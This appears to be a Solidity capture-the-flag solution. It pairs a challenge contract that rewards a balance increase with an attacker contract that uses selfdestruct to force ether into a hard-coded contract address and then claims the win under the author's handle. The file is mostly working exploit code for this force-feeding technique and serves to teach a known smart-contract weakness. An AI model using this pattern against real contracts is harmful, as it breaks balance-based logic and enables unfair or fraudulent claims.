//SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;
contract ForceFeed{

    // custom error
    error BalanceNotIncrease();

    mapping(address => string) public bookOfWinners;

    uint256 private lastBalance;

    constructor(){
        lastBalance = address(this).balance;
    }

    // check balance and update winner
    function checkBalanceAndReacordWinner(string memory userId) public{

        // checking for current balance is increased or not
        if(address(this).balance <= lastBalance){
            revert BalanceNotIncrease();
        }

        // updating book of winners
        bookOfWinners[msg.sender] = userId;

        // update the last balance with current one
        lastBalance = address(this).balance;
    }

}

contract sendingMyAddress{

    address private owner;

    ForceFeed public Force;
    address forceContract = 0x5E1c6Ee0702161aaEB79406c5221907fefa7627e;

    constructor() payable{
        owner = msg.sender;
        Force = ForceFeed(forceContract);
    }

    function selfDestruct() public{
        require(msg.sender == owner);
        selfdestruct(payable(forceContract));
    }

    function recordCall() public{
        Force.checkBalanceAndReacordWinner('@sharadpoddar11');
    }

}